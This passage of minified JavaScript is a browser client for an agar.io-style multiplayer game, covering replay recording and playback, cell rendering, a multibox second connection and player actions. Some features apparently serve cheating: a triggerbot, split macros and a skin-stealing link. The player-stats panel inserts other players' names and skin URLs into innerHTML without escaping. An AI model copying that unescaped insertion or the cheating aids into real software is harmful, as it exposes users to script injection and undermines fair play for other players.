                    let t = e.length,
                        s = new ArrayBuffer(t),
                        i = new Uint8Array(s);
                    for (let a = 0; a < t; a++) i[a] = e.charCodeAt(a);
                    return s
                },
                u = d(new ArrayBuffer(1)),
                g = e => {
                    let t = e.map(e => {
                            let t = {
                                pid: e.pid,
                                nickname: e.nameFromServer,
                                skinUrl: e.skinUrl,
                                perk_color:e.perk_color
                            };
                            return e.bot && (t.bot = !0), e.tagId && (t.tagId = e.tagId), e.perk_color && (t.perk_color = e.perk_color), t
                        }),
                        i = JSON.stringify(t);
                    i = unescape(encodeURIComponent(i));
                    let a = s.fromSize(1 + i.length + 1);
                    return a.writeUInt8(16), a.writeStringNT(i), d(a.buffer)
                },
                A = e => {
                    let t = 0,
                        i = e.length;
                    for (let a = 0; a < i; a++) {
                        let n = e[a];
                        t += 1 + (1 === n.type ? 2 : 0) + 2 + 2 + 2 + 2 + (n.flags ? 1 : 0)
                    }
                    let o = s.fromSize(1 + t + 1 + 2 + 2);
                    o.writeUInt8(10);
                    for (let r = 0; r < i; r++) {
                        let l = e[r],
                            c = 254 & l.flags;
                        o.writeUInt8(l.type | (c ? 128 : 0)), 1 === l.type && o.writeUInt16BE(l.pid), o.writeUInt16BE(l.id), o.writeInt16BE(l.x), o.writeInt16BE(l.y), o.writeUInt16BE(l.size), c && o.writeUInt8(c)
                    }
                    return o.writeUInt8(0), o.writeUInt16BE(0), o.writeUInt16BE(0), o.view
                };
            n.replay = new class e {
                constructor() {
                    this.cells = [
                        [],
                        []
                    ], this.packets = [
                        [],
                        []
                    ], this.database = h
                }
                recording() {
                    let e = this.packets[0];
                    return 0 != e.length
                }
                add(e, t) {
                    let s = this.cells[+t],
                        i = this.packets[+t],
                        a = [...(t ? n.dual : n).cells.values()];
                    s.push(a.map(e => ({
                        type: e.type,
                        id: e.id,
                        pid: e.pid,
                        x: e.nx,
                        y: e.ny,
                        size: e.nSize,
                        flags: e.flags
                    }))), i.push(e);
                    let o = 25 * l.replayDuration;
                    i.length > o && (i.shift(), s.shift())
                }
                clear(e) {
                    let t = this.cells[+e],
                        s = this.packets[+e];
                    t.length = 0, s.length = 0
                }
                play(e) {
                    n.running && n.stop(), n.connection.close(), r.toast.close();
                    let t = 1,
                        i = e.split("|");
                    "REPLAY" === i.at(0) && (t = parseInt(i[1]), i = i.slice(3));
                    let a = i.map(e => s.fromBuffer(p(e), 1)),
                        o = c(a.shift()),
                        l = [];
                    if (t >= 4) {
                        let h;
                        for (;
                            (h = a[0]).readUInt8(0);) {
                            let {
                                view: d
                            } = h;
                            d.packetId = 1, h.offset = 0, l.push(h), a.shift()
                        }
                        a.shift()
                    } else l.push(a.shift());
                    o.replayUpdates = a, n.start(o), l.forEach(e => n.parseMessage(e)), n.playback.setStartingFrame(), n.showMenu(!1)
                }
                save(e) {
                    let t = this.cells[+e].slice(0),
                        i = this.packets[+e].slice(0);
                    if (!i.length) return;
                    let a = [...n.playerManager.players.values()];
                    i.splice(0, 1, A(t.at(0)));
                    let c = ["REPLAY", 4];
                    c.push(n.createThumbnail()), c.push(d(n.initialDataPacket.buffer));
                    let {
                        dual: p
                    } = n;
                    if (p.connected) {
                        let m = s.fromSize(3);
                        m.writeUInt8(8), m.writeUInt16LE(p.pid), c.push(d(m.buffer))
                    }
                    c.push(g(a)), c.push(u), c.push(i.map(e => d(e.buffer)).join("|"));
                    let v = c.join("|");
                    h.setItem(o(), v, () => {
                        n.events.$emit("replay-added");
                        let e = "Replay saved!";
                        1 === l.showReplaySaved ? n.events.$emit("chat-message", e) : r.toast.fire({
                            type: "info",
                            title: e,
                            timer: 1500
                        })
                    }).catch(e => {
                        console.error("ReplayManager::save", e);
                        let t = "Error saving replay";
                        "string" == typeof e ? t += `: ${e}` : e && e.message && (t += `: ${e.message}`), r.toast.fire({
                            type: "error",
                            title: t
                        })
                    })
                }
            }
        }, , function(e, t, s) {
            let i = s(1),
                {
                    wasmModule: a,
                    addOrUpdateCell: n,
                    destroyCell: o,
                    eatCell: r
                } = s(79);
            e.exports = i.playback = new class e {
                constructor() {
                    this.updates = [], this.dry = !1, this.index = 0
                }
                destroyCell(e) {
                    let {
                        updates: t
                    } = this, s = t[0];
                    s[3][e] = !0;
                    let i = s[1];
                    i.push(e)
                }
                eatCell(e, t) {
                    let {
                        updates: s
                    } = this, i = s[0];
                    i[3][e] = !0;
                    let a = i[2];
                    a.push(e, t)
                }
                parse(e) {
                    a.deserialize(1, new Uint8Array(e.buffer, 1), 1)
                }
                reset() {
                    let {
                        updates: e
                    } = this;
                    e.splice(0, e.length), delete e.index
                }
                set(e) {
                    this.reset(), this.dry = !0;
                    let {
                        updates: t
                    } = this, s = e.length, i = 0;
                    for (; s--;) t.unshift([{},
                        [],
                        [], {}
                    ]), this.parse(e[i++]);
                    t.reverse(), delete this.dry, this.index = 0
                }
                setStartingFrame() {
                    let {
                        cells: e
                    } = i, {
                        updates: t
                    } = this, [s, a, n, o] = t;
                    for (let r of e.keys()) {
                        let l = e.get(r);
                        r in o || (r in s ? s[r].pid = l.pid : s[r] = {
                            type: l.type,
                            id: l.id,
                            pid: l.pid,
                            x: l.nx,
                            y: l.ny,
                            size: l.nSize,
                            flags: l.flags
                        })
                    }
                    for (let c = 1; c < t.length; c++) {
                        let h = t[c - 1],
                            d = t[c];
                        for (let p in d[0]) {
                            if (!(p in h[0])) continue;
                            let u = d[0][p],
                                g = h[0][p];
                            16 & u.type && (u.pid = g.pid), 32 & u.type && (u.x = g.x, u.y = g.y), 64 & u.type && (u.size = g.size)
                        }
                        for (let A in h[0]) A in d[3] || A in d[0] || (d[0][A] = h[0][A])
                    }
                }
                seek(e, t) {
                    let {
                        cells: s
                    } = i, a = this.updates[e];
                    for (let r of s.keys()) !t && r in a[0] || o(r, 1);
                    for (let l of Object.values(a[0])) {
                        let {
                            type: c,
                            pid: h,
                            id: d,
                            x: p,
                            y: u,
                            size: g,
                            flags: A
                        } = l;
                        n(c, h, d, p, u, g, A, 1, 1)
                    }
                    this.index = e, i.updateCamera(!0)
                }
                next() {
                    let {
                        updates: e
                    } = this;
                    if (this.index < e.length) {
                        let [t, s, a] = e[this.index++];
                        for (let l of Object.values(t)) {
                            let {
                                type: c,
                                pid: h,
                                id: d,
                                x: p,
                                y: u,
                                size: g,
                                flags: A
                            } = l;
                            n(c, h, d, p, u, g, A, 1, 1)
                        }
                        let m = s.length,
                            v = 0;
                        for (; v < m;) o(s[v++], 1);
                        for (m = a.length, v = 0; v < m;) r(a[v++], a[v++], 1);
                        i.updateCamera(!0)
                    } else this.seek(0, !0);
                    i.events.$emit("replay-index-change", this.index)
                }
            }
        }, function(e, t, s) {
            e.exports = {
                PlayerCell: s(134),
                Food: s(135),
                Virus: s(136),
                EjectedMass: s(137),
                DeadCell: s(138),
                Crown: s(139)
            }
        }, function(e, t, s) {
            let i = s(1),
                a = s(4),
                o = s(14),
                r = e => {
                    let t = new PIXI.BitmapText("", {
                            fontName: "mass",
                            align: "right"
                        }),
                        s = e.strokeThickness || 0;
                    return t.position.set(-s / 2, -s / 2), t.anchor.set(.5, -.6), t
                };
            class l extends PIXI.Graphics {
                constructor(e) {
                    super(), this.alpha = .35, this.updatePoints(e)
                }
                updatePoints(e, t, s, i) {
                    e && t && s && i && (this.clear(), this.lineStyle(12, 16777215), this.moveTo(e, t), this.lineTo(s, i))
                }
            }
            class c extends o {
                constructor(e, t) {
                    super(e), this.player = t, this.pid = t.pid;
                    let s = this.isMe = this.pid == i.playerId || this.pid === i.multiboxPid,
                        {
                            ownedCells: a
                        } = i;
                    s && !a.has(this) && a.add(this), t.hasCrown && this.addCrown(), !i.replaying && s && (this.addArrow(), this.addLine())
                }
                updateLineVisibility() {
                    let {
                        line: e
                    } = this;
                    if (e) {
                        if (a.showCellLines) {
                            let {
                                dual: t
                            } = i;
                            t.connected ? e.visible = this.pid === i.activePid : e.visible = !0
                        } else e.visible = !1
                    }
                }
                addLine() {
                    let {
                        x: e,
                        y: t
                    } = i.mouse;
                    this.line = new l([this.x, this.y, e, t]), i.scene.container.addChild(this.line), this.updateLineVisibility()
                }
                addArrow() {
                    let {
                        dual: e
                    } = i;
                    if (!e.arrowSprite) {
                        console.error("Arrow sprite not set?");
                        return
                    }
                    let t = this.arrowSprite = new PIXI.Sprite.from(e.arrowSprite.texture);
                    t.visible = a.mbActive >= 2 && this.pid === i.activePid, t.anchor.set(.5), t.width = t.height = 130, t.alpha = .95, t.y = -310, this.sprite.addChild(t)
                }
                addCrown() {
                    if (this.crownSprite) return;
                    let e = i.crownPool,
                        t;
                    e.length ? t = e.pop() : ((t = PIXI.Sprite.from("/img/crown.png")).scale.set(.7), t.pivot.set(0, 643), t.anchor.x = .5, t.rotation = -.5, t.alpha = .7, t.zIndex = 2), this.crownSprite = t, this.sprite.addChild(t)
                }
                removeCrown() {
                    let e = this.crownSprite;
                    e && (this.sprite.removeChild(e), i.crownPool.push(e), this.crownSprite = null)
                }
                onUpdate() {
                    if (a.showDir && !this.directionSprite) {
                        let e = this.directionSprite = new PIXI.Sprite.from("https://i.postimg.cc/vmZmWCRR/4-Point-Star.png");
                        e.scale.set(.1), e.alpha = .7, e.anchor.set(3.5, 3.5), this.sprite.addChild(e)
                    }
                    let t = i.scene.container.scale.x * this.size * i.renderer.resolution,
                        s = t > a.smallTextThreshold,
                        {
                            player: o
                        } = this;
                    if (o.massShown && !this.massText && s && (this.massText = i.massTextPool.pop() || r(a.massTextStyle), this.massText.zIndex = 0, this.sprite.addChild(this.massText)), o.nameShown && !this.nameSprite && o.nameSprite && s && (this.nameSprite = new PIXI.Sprite(o.nameSprite.texture), this.nameSprite.anchor.set(.5), this.nameSprite.zIndex = 1, this.sprite.addChild(this.nameSprite)), a.showTag && !this.tagSprite && o.tagSprite && (o.tagId !== i.tagId || null === i.tagId)) {
                        let l = this.tagSprite = new PIXI.Sprite(o.tagSprite.texture);
                        l.anchor.set(.5), l.y = 180*i.rendering_scale, l.zIndex = 1, this.sprite.addChild(l)
                    }
                    let {
                        line: c
                    } = this;
                    if (c && c.visible) {
                        let {
                            x: h,
                            y: d
                        } = i.mouse;
                        c.updatePoints(this.x, this.y, h, d)
                    }
                    this.crownSprite && (this.crownSprite.visible = t > 16 && a.showCrown), this.nameSprite && (this.nameSprite.visible = o.nameShown && s), this.tagSprite && (this.tagSprite.visible = a.showTag);
                    let {
                        directionSprite: p
                    } = this;
                    if (p && (p.visible = a.showDir && !o.isMe)) {
                        let u = 0,
                            g = !1,
                            {
                                ox: A,
                                oy: m,
                                nx: v,
                                ny: f
                            } = this;
                        v > A ? (v - A < 3 && (g = !0), u = f < m ? g ? 0 : m - f < 3 ? 2 : 1 : g ? 4 : f - m < 3 ? 2 : 3) : (A - v < 3 && (g = !0), u = f < m ? g ? 0 : m - f < 3 ? 6 : 7 : g ? 4 : f - m < 3 ? 6 : 5), p.rotation = n[u]
                    }
                    let {
                        massText: C
                    } = this;
                    if (C) {
                        if (o.massShown && s) {
                            let y = i.getMassText(this.nSize * this.nSize / 100);
                            C.text = y, C.visible = !0
                        } else C.visible && (C.visible = !1)
                    }
                }
                onDestroy() {
                    this.arrowSprite && (this.sprite.removeChild(this.arrowSprite), this.arrowSprite.destroy(), delete this.arrowSprite), this.tagSprite && (this.sprite.removeChild(this.tagSprite), this.tagSprite.destroy(), delete this.tagSprite), this.directionSprite && (this.sprite.removeChild(this.directionSprite), this.directionSprite.destroy(), delete this.directionSprite), this.line && (i.scene.container.removeChild(this.line), this.line.destroy(), delete this.line), this.massText && (this.sprite.removeChild(this.massText), i.massTextPool.push(this.massText)), this.crownSprite && this.removeCrown()
                }
            }
            c.prototype.type = 1, c.prototype.isPlayerCell = !0, e.exports = c
        }, function(e, t, s) {
            let i = s(4),
                {
                    cells: a
                } = s(12),
                {
                    neon: n
                } = s(76),
                o = s(14),
                r = e => a.getTexture(i.useFoodColor ? parseInt(i.foodColor, 16) : n[e % n.length]);
            class l extends o {
                constructor(e) {
                    e.texture = r(e.id), super(e)
                }
                reloadTexture() {
                    this.sprite.texture = this.texture = r(this.id)
                }
            }
            l.prototype.type = 4, l.prototype.isFood = !0, e.exports = l
        }, function(e, t, s) {
            let i = s(14),
                {
                    virus: a
                } = s(12);
            class n extends i {
                constructor(e) {
                    e.texture = a.getTexture(), super(e)
                }
                resetTexture() {
                    this.destroySprite(), this.texture = a.getTexture(), this.sprite = new PIXI.Sprite(this.texture), this.sprite.anchor.set(.5), this.sprite.gameData = this
                }
            }
            n.prototype.type = 2, n.prototype.isVirus = !0, e.exports = n
        }, function(e, t, s) {
            let i = s(1),
                a = s(4),
                {
                    cells: n
                } = s(12),
                o = s(14),
                r = () => n.getTexture(parseInt(a.ejectedColor, 16)),
                {
                    clampNumber: l
                } = s(8);
            class c extends o {
                constructor(e) {
                    e.texture = r(), super(e), this.sprite.alpha = 0
                }
                reloadTexture() {
                    this.sprite.texture = this.texture = r()
                }
                onUpdate() {
                    let {
                        sprite: e
                    } = this;
                    if (!e || 1 == e.alpha) return;
                    let t = i.timeStamp - this.updateStamp,
                        s = l(t / 1e3, 0, 1);
                    e.alpha = Math.min(e.alpha + s, 1)
                }
            }
            c.prototype.type = 3, c.prototype.isEjected = !0, e.exports = c
        }, function(e, t, s) {
            let i = s(14),
                {
                    squares: a,
                    cells: n
                } = s(12);
            class o extends i {
                constructor(e, t, s) {
                    e.texture = (s ? a : n).getTexture(t || 4210752), super(e), this.sprite.alpha = .5
                }
            }
            o.prototype.type = 5, o.prototype.isDead = !0, e.exports = o
        }, function(e, t, s) {
            let i = s(14);
            class a extends i {
                constructor(e) {
                    e.texture = PIXI.Texture.from("/img/crown.png"), super(e), this.sprite.alpha = .7
                }
            }
            a.prototype.type = 6, a.prototype.isCrown = !0, e.exports = a
        }, function(e, t, s) {}, function(e, t, s) {}, function(e, t, i) {
            let n = i(1),
                {
                    state: o
                } = n,
                r = i(78),
                {
                    wasmModule: l
                } = i(79);
            e.exports = n.dual = new class e {
                constructor() {
                    this.ws = null, this.focused = !1, this.opened = !1, this.pid = null, this.pingStamp = 0, this.autoRespawning, this.alive, this.ticksSinceDeath = 0, this.cells = new Map, this.arrowSprite = null, this.reloadArrow()
                }
                log(e) {
                    n.events.$emit("chat-message", e)
                }
                get connected() {
                    return this.opened && !!this.ready
                }
                open() {
                    let {
                        connectionUrl: e
                    } = o;
                    if (!e) return;
                    let t = this.ws = new WebSocket(e, "tFoL46WDlZuRja7W6qCl");
                    t.binaryType = "arraybuffer", t.packetCount = 0, this.opened = !0, t.onopen = () => {
                        this.opened && (this.ws.onclose = this.onClosed.bind(this), this.reloadArrow())
                    }, t.onmessage = e => {
                        let {
                            data: t
                        } = e;
                        n.nwData += t.byteLength, this.handleMessage(new DataView(t))
                    }, t.onclose = this.onRejected.bind(this)
                }
                close() {
                    let {
                        ws: e
                    } = this;
                    e && (e.onmessage = null, e.onclose = null, e.onerror = null, e.close(), this.ws = null), this.focused = !1, this.opened = !1, this.pid = n.multiboxPid = null, this.pingStamp = 0, delete this.alive, this.ticksSinceDeath = 0, delete this.ready, this.clearCells(), this.feedTimeout && (clearTimeout(this.feedTimeout), delete this.feedTimeout)
                }
                onRejected() {
                    let e = atob("RHVhbCBmYWlsZWQgdG8gY29ubmVjdA==");
                    this.log(e)
                }
                onClosed(e) {
                    let t = "Dual disconnected";
                    e.reason && (t += ` (${e.reason})`), this.log(t), this.close()
                }
                parseCells(e) {
                    l.deserialize(2, new Uint8Array(e.buffer, 1), this.ws.packetCount++)
                }
                handleMessage(e) {
                    let t = new s(e),
                        i = t.readUInt8();
                    switch (i) {
                        case 1: {
                            let o = r(t);
                            n.multiboxPid = this.pid = o.playerId, this.log("Dual connected"), setTimeout(() => {
                                this.ready = !0;
                                let e = n.playerManager.getPlayer(this.pid);
                                e.isMe = !0, n.replay.clear(!1)
                            }, 500);
                            return
                        }
                        case 2: {
                            let l = new Uint8Array(e.buffer, 1);
                            n.connection.sendJoinData(new a(l).build(), !0);
                            return
                        }
                        case 6:
                            n.connection.sendOpcode(6, !0);
                            return;
                        case 10: {
                            n.timeStamp = performance.now(), this.parseCells(t), n.updateStates(!1);
                            let c = this.alive,
                                {
                                    replay: h
                                } = n;
                            if (c ? h.add(e, !0) : n.alive || h.clear(!0), !this.alive && this.autoRespawning && 37 == ++this.ticksSinceDeath && n.triggerAutoRespawn(!0), !this.focused) return;
                            n.updateCamera(!0);
                            return
                        }
                        case 18: {
                            let {
                                replay: d
                            } = n;
                            d.clear(!0), this.clearCells();
                            return
                        }
                        case 20:
                            n.handleDeath(t, !0);
                            return;
                        case 22:
                            n.events.$emit("m-show-image-captcha");
                            return
                    }
                }
                ping() {
                    this.pingStamp = performance.now(), n.connection.sendOpcode(3, !0)
                }
                spawn() {
                    this.connected && (n.actions.join(!0), this.updateOutlines())
                }
                updateOutlines() {
                    let e = n.playerId,
                        t = this.pid,
                        {
                            players: s
                        } = n.playerManager;
                    if (!s.has(e) || !s.has(t)) return;
                    let i = s.get(e),
                        a = s.get(t),
                        o = [];
                    switch (n.allCells.forEach(e => {
                            e.pid && e.isMe && e.arrowSprite && o.push(e)
                        }), settings.mbActive) {
                        case 0:
                            break;
                        case 1: {
                            o.length > 0 && o.forEach(e => {
                                e.arrowSprite.visible = !1
                            });
                            let r = +("0x" + settings.mbColor);
                            this.focused ? (i.setOutline(16777215), a.setOutline(r)) : (a.setOutline(16777215), i.setOutline(r));
                            break
                        }
                        case 2:
                        case 3:
                            i.outlineGraphic && i.setOutline(0, 0, !0), a.outlineGraphic && a.setOutline(0, 0, !0), o.forEach(e => {
                                e.arrowSprite.visible = e.pid === n.activePid
                            })
                    }
                    settings.showCellLines && n.allCells.forEach(e => {
                        e.line && e.updateLineVisibility()
                    })
                }
                reloadArrow() {
                    if (this.arrowSprite && this.arrowSprite.destroy(), settings.mbArrow.startsWith("data:image")) {
                        let e = document.createElement("img");
                        e.src = settings.mbArrow;
                        let t = new PIXI.BaseTexture(e),
                            s = new PIXI.Texture(t);
                        this.arrowSprite = new PIXI.Sprite(s)
                    } else this.arrowSprite = new PIXI.Sprite.from(settings.mbArrow)
                }
                get position() {
                    let e = 0,
                        t = 0,
                        s = [...this.cells.values()].filter(e => e.pid && e.pid == this.pid && !!e.sprite);
                    if (0 == s.length) return [];
                    s.forEach(({
                        x: s,
                        y: i
                    }) => {
                        e += s, t += i
                    });
                    let i = s.length;
                    return [e / i, t / i]
                }
                get ownerPosition() {
                    let e = 0,
                        t = 0,
                        s = [...n.cells.values()].filter(e => e.pid && e.pid == n.playerId && !!e.sprite);
                    if (0 == s.length) return [];
                    s.forEach(({
                        x: s,
                        y: i
                    }) => {
                        e += s, t += i
                    });
                    let i = s.length;
                    return [e / i, t / i]
                }
                getDistanceFromOwner() {
                    let [e, t] = this.position;
                    if (void 0 == e) return null;
                    let [s, i] = this.ownerPosition;
                    return null == s ? null : Math.hypot(s - e, i - t)
                }
                clearCells() {
                    this.cells.forEach(e => e.destroy(2));
                    let {
                        destroyedCells: e
                    } = n, t = e.length;
                    for (; t--;) {
                        let s = e[t];
                        s.destroySprite(), e.splice(t, 1)
                    }
                }
                switch () {
                    if (n.spectating && (n.spectating = !1), !this.opened) return void this.open();
                    if (!this.ready) return;
                    let e = this.focused;
                    this.feedTimeout && (clearTimeout(this.feedTimeout), delete this.feedTimeout), settings.rememeberEjecting || (this.feedTimeout = setTimeout(() => {
                        if (n.isAlive(e)) {
                            let t = s.fromSize(2);
                            t.writeUInt8(21), t.writeUInt8(0), n.connection.send(t, e)
                        }
                    }, 120)), e ? (n.isAlive(!1) || o.autoRespawning || n.actions.join(), n.activePid = n.playerId, this.focused = !1) : (n.isAlive(!0) || this.autoRespawning || this.spawn(), n.activePid = this.pid, this.focused = !0), this.updateOutlines()
                }
            }
        }, function(e, t, s) {}, function(e) {
            e.exports = function(e) {
                var t = 1,
                    s = e.getInt16(t, !0);
                t += 2;
                for (var i = "", a = ""; 0 != (a = e.getUint16(t, !0));) t += 2, i += String.fromCharCode(a);
                return {
                    pid: s,
                    text: i
                }
            }
        }, function(e) {
            e.exports = function(e) {
                for (var t = 1, s = [];;) {
                    var i = e.getUint16(t, !0);
                    if (t += 3, !i) break;
                    var a = e.getUint8(t, !0) / 255;
                    t += 1;
                    var n = e.getUint8(t, !0) / 255;
                    t += 1, s.push({
                        pid: i,
                        x: a,
                        y: n
                    })
                }
                return s
            }
        }, function(e) {
            e.exports = function(e, t) {
                for (var s = 1, i = [];;) {
                    var a = t.getUint16(s, !0);
                    if (s += 2, !a) break;
                    var n = e.playerManager.getPlayer(a);
                    n && i.push({
                        pid: a,
                        position: 1 + i.length,
                        text: n.name,
                        perk_color: n.perk_colorCss || "#ffffff",
                        bold: !!n.perk_color
                    })
                }
                return i
            }
        }, function(e) {
            e.exports = window.WebSocket
        }, function(e, t, s) {
            let i = s(1);
            s(149);
            let a = s(66),
                n = i.renderer.view,
                o = a.pressed = new Set;
            window.addEventListener("blur", () => {
                o.clear()
            });
            let r = /firefox/i.test(navigator.userAgent) ? "DOMMouseScroll" : "wheel",
                l = e => {
                    let t = i.actions.findPlayerUnderMouse(),
                        s = t && t.player;
                    s && i.events.$emit("context-menu", e, s)
                },
                c = () => {
                    i.scene.setPosition()
                },
                h = e => i.actions.zoom(e),
                d = e => {
                    let t = {
                        x: e.clientX,
                        y: e.clientY
                    };
                    Object.assign(i.rawMouse, t), i.updateMouse()
                },
                p = e => {
                    e.preventDefault(), n.focus();
                    let t = `MOUSE${e.button}`;
                    if (0 === e.button && i.spectating) {
                        let s = i.actions.findPlayerUnderMouse();
                        s && i.actions.spectate(s.pid)
                    } else a.press(t)
                },
                u = e => {
                    let t = "MOUSE" + e.button;
                    a.release(t), o.delete(t)
                },
                g = e => {
                    let t = e.target === n;
                    if (!t && e.target !== document.body) return;
                    let s = a.convertKey(e.code);
                    if (!o.has(s) && (!e.ctrlKey || "TAB" !== s)) {
                        if (o.add(s), "ESCAPE" === s) {
                            if (i.replaying) o.clear(), i.stop(), i.showMenu(!0);
                            else {
                                let r = !!i.dual.autoRespawning;
                                (i.state.autoRespawning || r) && i.triggerDeathDelay(r), i.showMenu()
                            }
                            return
                        }
                        if ("ENTER" === s) {
                            i.events.$emit("chat-focus");
                            return
                        }
                        t && a.press(s) && e.preventDefault()
                    }
                },
                A = e => {
                    let t = a.convertKey(e.code);
                    a.release(t), o.delete(t)
                };
            i.eventListeners = e => {
                e ? (n.addEventListener("contextmenu", l), window.addEventListener("resize", c), n.addEventListener(r, h, {
                    passive: !0
                }), document.body.addEventListener("mousemove", d), n.addEventListener("mousedown", p), document.addEventListener("mouseup", u), document.body.addEventListener("keydown", g), document.body.addEventListener("keyup", A), window.onbeforeunload = () => "Are you sure you want to close the page?") : (n.removeEventListener("contextmenu", l), window.removeEventListener("resize", c), n.removeEventListener(r, h), document.body.removeEventListener("mousemove", d), n.removeEventListener("mousedown", p), document.removeEventListener("mouseup", u), document.body.removeEventListener("keydown", g), document.body.removeEventListener("keyup", A), window.onbeforeunload = null)
            }
        }, function(e, t, i) {
            let a = i(1),
                n = i(4),
                {
                    writeUserData: o,
                    clampNumber: r
                } = i(8);
            a.actions = new class e {
                constructor() {
                    this.linesplitUnlock
                }
                spectate(e, t) {
                    a.spectating = !0;
                    let i = s.fromSize(e ? 3 : 1);
                    i.writeUInt8(2), e && i.writeInt16LE(e), a.connection.send(i, t)
                }
                join(e) {
                    a.events.$emit("reset-cautions");
                    let t = s.fromSize(8);
                    t.writeUInt8(1), o(t, e), a.connection.send(t, e)
                }
                spectateLockToggle() {
                    a.connection.sendOpcode(10)
                }
                feed(e) {
                    let t = 1 === arguments.length,
                        i = s.fromSize(t ? 2 : 1);
                    i.writeUInt8(21), t && i.writeUInt8(+e), a.connection.send(i, a.dual.focused)
                }
                freezeMouse(e) {
                    a.running && ((e ??= !a.mouseFrozen) && (this.stopMovement(!1), this.lockLinesplit(!1), a.updateMouse(!0), a.connection.sendMouse()), a.mouseFrozen = e, a.events.$emit("update-cautions", {
                        mouseFrozen: e
                    }))
                }
                stopMovement(e) {
                    a.running && ((e ??= !a.moveToCenterOfCells) && (this.freezeMouse(!1), this.lockLinesplit(!1), e = a.dual.focused ? 2 : 1), a.moveToCenterOfCells = e, a.events.$emit("update-cautions", {
                        moveToCenterOfCells: e
                    }))
                }
                lockLinesplit(e) {
                    a.running && ((e ??= !a.stopMovePackets) && (a.updateMouse(), a.connection.sendMouse(), a.connection.sendOpcode(15, a.dual.focused), e = a.dual.focused ? 2 : 1), a.stopMovePackets = e, a.events.$emit("update-cautions", {
                        lockLinesplit: e
                    }))
                }
                linesplit() {
                    this.freezeMouse(!0), this.split(3, !0), this.linesplitUnlock && clearTimeout(this.linesplitUnlock), this.linesplitUnlock = setTimeout(() => {
                        delete this.linesplitUnlock, this.freezeMouse(!1)
                    }, 1250)
                }
                split(e, t, i) {
                    if (a.stopMovePackets || (t || this.freezeMouse(!1), a.connection.sendMouse()), i) return void setTimeout(() => this.split(e), i);
                    let n = s.fromSize(2);
                    n.writeUInt8(17), n.writeUInt8(e), a.connection.send(n, a.dual.focused), a.splitCount += e, a.splitCount <= 2 ? a.moveWaitUntil = performance.now() + 300 : (a.moveWaitUntil = 0, a.splitCount = 0)
                }
                triggerbot() {
                    let e = a.targetPid;
                    if (e) {
                        delete a.targetPid;
                        let t = a.playerManager.getPlayer(e);
                        t && t.setOutline(0, 0, !0), a.setText("")
                    } else a.targetPid = null, a.setText("Click a player to lock triggerbot")
                }
                multicombo(e) {
                    if (!a.isAlive(!1) || !a.isAlive(!0)) return;
                    let {
                        dual: t
                    } = a;
                    switch (e) {
                        case 1:
                            this.split(1), t.focused = !t.focused, a.connection.sendMouse(), this.split(6), setTimeout(() => this.split(6), 30);
                            break;
                        case 2:
                            this.split(2), t.focused = !t.focused, a.connection.sendMouse(), this.split(6), setTimeout(() => this.split(6), 30);
                            break;
                        case 3:
                            this.linesplit(), t.focused = !t.focused, a.connection.sendMouse(), this.split(6, !0), setTimeout(() => this.split(6, !0), 30)
                    }
                    setTimeout(() => {
                        t.focused = !t.focused
                    }, 45)
                }
                zoom(e) {
                    let t = 1 - n.cameraZoomSpeed / 100,
                        s = 0;
                    e.detail ? s = e.detail / 3 : e.wheelDelta && (s = -(e.wheelDelta / 120));
                    let i = Math.pow(t, s);
                    a.mouseZoom = r(a.mouseZoom * i, a.mouseZoomMin, 1)
                }
                setZoomLevel(e) {
                    a.mouseZoom = .8 / Math.pow(2, e - 1)
                }
                targetPlayer(e) {
                    "string" == typeof e && (e = +e);
                    let t;
                    if (e) a.selectedPlayer = e, t = a.playerManager.getPlayer(e);
                    else {
                        let s = this.findPlayerUnderMouse();
                        s && (t = s && s.player) && (a.selectedPlayer = s.pid)
                    }
                    n.playerStats && t ? a.playerElement.innerHTML = `
        ${t.skinUrl?`<img src="${t.skinUrl}" width="100" style="cursor:pointer" title="Left click to steal | Right click to copy" oncontextmenu="window.copySkin('${t.skinUrl}')" onclick="window.yoinkSkin('${t.skinUrl}')"><br>`:""}
        <font color="${"#"+(t.perk_colorCss||"ffffff")}">${t.name}</font><br>${t.pid} : ${t.tagId}
        ` : a.playerElement.innerHTML = ""
                }
                findPlayerUnderMouse() {
                    let {
                        x: e,
                        y: t
                    } = a.mouse, s = 0, i = null, n = [...a.allCells.values()].filter(e => e.pid).sort((e, t) => e.size - t.size);
                    return n.forEach(a => {
                        if (!a.isPlayerCell) return;
                        let n = a.x - e,
                            o = a.y - t,
                            r = Math.sqrt(Math.abs(n * n + o * o)) - a.size;
                        if (r < s) s = r, i = a;
                        else if (r <= 0) return a
                    }), i
                }
                toggleSkins(e) {
                    e ??= !n.skinsEnabled, n.set("skinsEnabled", e), a.playerManager.invalidateVisibility()
                }
                toggleNames(e) {
                    e ??= !n.namesEnabled, n.set("namesEnabled", e), a.playerManager.invalidateVisibility()
                }
                toggleMass() {
                    let e = !n.massEnabled;
                    n.set("massEnabled", e), a.playerManager.invalidateVisibility()
                }
                toggleFood(e) {
                    e ??= !n.foodVisible, n.set("foodVisible", e), a.scene.food.visible = e
                }
                toggleHud() {
                    let {
                        app: e
                    } = a, t = !e.showHud;
                    e.showHud = t, n.set("showHud", t)
                }
                toggleChat() {
                    let e = !n.showChat;
                    n.set("showChat", e), a.running && a.events.$emit("chat-visible", {
                        visible: e
                    })
                }
                toggleChatToast() {
                    let e = !n.showChatToast;
                    n.set("showChatToast", e), a.events.$emit("chat-visible", {
                        visibleToast: e
                    })
                }
            }
        }, , , , , , , , , , , , , , , , , function(e, t, s) {
            "use strict";
            var i = s(29);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(32);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(33);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(34);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(35);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(36);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(37);
            s.n(i).a
        }, function() {}, , , , , , function() {}, , function() {}, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , function(e, t, s) {
            "use strict";
            var i = s(40);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(41);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(42);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(43);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            "use strict";
            var i = s(44);
            s.n(i).a
        }, function() {}, function(e, t, s) {
            e.exports = new class e {
                constructor(e, t) {
